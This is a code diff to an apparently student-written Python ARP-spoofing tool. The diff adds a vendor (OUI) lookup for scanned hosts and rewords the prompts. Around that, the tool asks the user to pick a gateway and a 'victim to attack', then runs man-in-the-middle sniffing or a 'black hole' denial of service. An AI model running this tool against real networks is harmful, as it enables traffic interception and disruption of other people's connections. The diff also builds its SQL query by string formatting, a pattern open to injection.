@@ -7,6 +7,9 @@ import socket
 import netifaces
 import time
 import enum
+import sqlite3
+import pandas as pd
+from pandas import DataFrame
 
 target_interface = "empty"
 attacker_mac = "ff:ff:ff:ff:ff:ff"
@@ -22,6 +25,26 @@ class SniffType(enum.IntEnum):
     ALL_PACKETS = 1
     VICTIM_PACKETS = 2
 
+
+def create_db_and_table():
+    conn = sqlite3.connect('OUIMapping.db')
+    conn.text_factory = str
+    print "[Info.] Connect database successfully"
+
+    read_clients = pd.read_csv (r'./mac_address.csv')
+    read_clients.to_sql('OUIMAPPING', conn, if_exists='replace', index = False)
+    print "[Info.] Create table successfully"
+
+    return conn
+
+def manipulate_db(conn, sql_command):
+    c = conn.cursor()
+    result = c.execute(sql_command)
+    for row in result:
+        if row:
+            return row
+        else:
+            return None
 
 def man_in_the_middle(sniffing_mode_choice):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -221,7 +244,7 @@ if __name__ == "__main__":
         interface_count += 1
 
     while True:
-        interface_choice = int(raw_input("[Info.] Please select the interface you want to scan.\n"))
+        interface_choice = int(raw_input("[Enter] Please select the interface you want to scan.\n>>"))
         if interface_choice > 0 and interface_choice <= interface_count:
             interface_name = available_interfaces[(interface_choice - 1)]
             break
@@ -233,7 +256,10 @@ if __name__ == "__main__":
     print "[Info.] MAC info: %s" % (interface_mac)
     attacker_mac = interface_mac[0]['addr']
 
-    ip_range = raw_input("[Info.] Please input the IP range you want to scan (e.g., 192.168.0.0/24):\n")
+    ip_range = raw_input("[Enter] Please input the IP range you want to scan (e.g., 192.168.0.0/24):\n>>")
+
+    print "[Info.] Creating OUI DB..."
+    connection = create_db_and_table()
 
     print "[Info.] Now scanning...\n[Info.] Please wait for a while."
     start_time = datetime.now()
@@ -241,16 +267,23 @@ if __name__ == "__main__":
 
     ans, unans = srp(Ether(dst=broadcast_mac)/ARP(pdst=ip_range), timeout=8, iface=interface_name, inter=0.12)
     device_list = []
-    #ip_list = []
-    #mac_list = []
-    print "\n[Info.] Host list:\n{:^7}|{:^15}|{:^20}".format("No.", "IP", "MAC")
+
+    print "\n[Info.] Host list:\n{:^7}|{:^17}|{:^21}|{:^42}".format("No.", "IP", "MAC", "Company")
     count = 0
     for snd, rcv in ans:
         count += 1
-        device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%")})
-        #ip_list.append(rcv.sprintf("%ARP.psrc%"))
-        #mac_list.append(rcv.sprintf("%Ether.src%"))
-        print "[{:^5}]:{:^15}-{:^20}".format(count, device_list[(count - 1)]["IP"], device_list[(count - 1)]["MAC"])
+        sql_command = ('''
+            SELECT *
+            FROM OUIMAPPING
+            WHERE oui = '%s'
+            '''
+            % (rcv.sprintf("%Ether.src%").upper()[:8]))
+        oui_info = manipulate_db(connection, sql_command)
+        if not oui_info:
+            device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%").upper(), "Company": "N/A"})
+        else:
+            device_list.append({"IP": rcv.sprintf("%ARP.psrc%"), "MAC": rcv.sprintf("%Ether.src%").upper(), "Company": oui_info[2]})
+        print "[{:^5}]:{:^17}-{:^21}-{:^42}".format(count, device_list[(count - 1)]["IP"], device_list[(count - 1)]["MAC"], device_list[(count - 1)]["Company"])
 
     stop_time = datetime.now()
     total_time = stop_time - start_time
@@ -259,15 +292,16 @@ if __name__ == "__main__":
     print "[Info.] Device number in the subnet: %d" % (device_count)
 
     while True:
-        gateway_info = int(raw_input("[Info.] Please select the subnet gateway IP: \n"))
+        gateway_info = int(raw_input("[Enter] Please select the subnet gateway IP:\n>>"))
         if gateway_info > 0 and gateway_info <= device_count:
             break
+
     while True:
-        victim_info = int(raw_input("[Info.] Please select an IP(Victim) to attack: \n"))
+        victim_info = int(raw_input("[Enter] Please select an IP(Victim) to attack:\n>>"))
         if victim_info > 0 and victim_info <= device_count:
             break
 
-    print "[Info.] Host: %s is the victim to attack." % device_list[(victim_info - 1)]["IP"]
+    print "[Info.] Target interface:%s, victim: %s" % (interface_name, device_list[(victim_info - 1)]["IP"])
 
     available_attacking_mode = {AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE}
     available_sniffing_mode = {SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS}
@@ -275,33 +309,29 @@ if __name__ == "__main__":
     while True:
         print "[Info.] Please select an attacking mode:"
         print "[%d] Man in the middle(MITM)\n[%d] Black Hole" % (AttackType.MAN_IN_THE_MIDDLE, AttackType.BLACK_HOLE)
-        function_choice = int(raw_input("[Info.] Function:\n"))
+        function_choice = int(raw_input("[Enter] Function:\n>>"))
         if function_choice in available_attacking_mode:
             break
 
     while True:
         if function_choice == AttackType.MAN_IN_THE_MIDDLE:
             target_interface = interface_name
-            print "[Info.] target_interface=%s" % target_interface
             victim_IP = device_list[(victim_info - 1)]["IP"]
             gateway_IP = device_list[(gateway_info - 1)]["IP"]
-            print "[Info.] victim_IP=%s, gateway_IP=%s" % (victim_IP, gateway_IP)
 
             while True:
                 print "[Info.] Please select the sniffing mode you want:"
                 print "[%d] All packets in the specific network interface\n[%d] Only packets related to the victim" \
                     % (SniffType.ALL_PACKETS, SniffType.VICTIM_PACKETS)
-                sniffing_mode_choice = int(raw_input("[Info.] Sniffing mode:\n"))
+                sniffing_mode_choice = int(raw_input("[Enter] Sniffing mode:\n>>"))
                 if sniffing_mode_choice in available_sniffing_mode:
                     break
             man_in_the_middle(sniffing_mode_choice)
             break
         elif function_choice == AttackType.BLACK_HOLE:
             target_interface = interface_name
-            print "[Info.] target_interface=%s" % target_interface
             victim_IP = device_list[(victim_info - 1)]["IP"]
             gateway_IP = device_list[(gateway_info - 1)]["IP"]
-            print "[Info.] victim_IP=%s, gateway_IP=%s" % (victim_IP, gateway_IP)
             black_hole()
             break
         else:
